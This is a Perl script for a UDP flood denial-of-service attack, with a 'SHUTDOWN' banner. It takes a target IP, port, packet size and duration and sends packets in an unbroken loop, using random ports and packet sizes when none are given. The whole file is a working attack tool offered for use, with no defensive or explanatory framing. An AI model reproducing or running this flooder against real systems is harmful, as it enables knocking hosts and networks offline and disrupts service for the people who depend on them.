#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##############
# FantasyLux
##############

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD GREEN<<EOTEXT;
 SSSSS  HH   HH UU   UU TTTTTTT DDDDD    OOOOO  WW      WW NN   NN 
SS      HH   HH UU   UU   TTT   DD  DD  OO   OO WW      WW NNN  NN 
 SSSSS  HHHHHHH UU   UU   TTT   DD   DD OO   OO WW   W  WW NN N NN 
     SS HH   HH UU   UU   TTT   DD   DD OO   OO  WW WWW WW NN  NNN 
 SSSSS  HH   HH  UUUUU    TTT   DDDDDD   OOOO0    WW   WW  NN   NN                                                                                                                                                                                   
EOTEXT

print "\033[0;35m[\033[1;35mDOWN\033[1;m]\033[1;35m\nReady .. Set .. and..DOWN\034[\033[0;36mCONNECTED\033[0;36m]\n\033[1;36mWIFIdown \033[0;36m$ip..\033[1;m";
sleep 1;
print "\n\033[0;32mShutdown \033[1;32m$ip..\033[1;m"; 

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));} 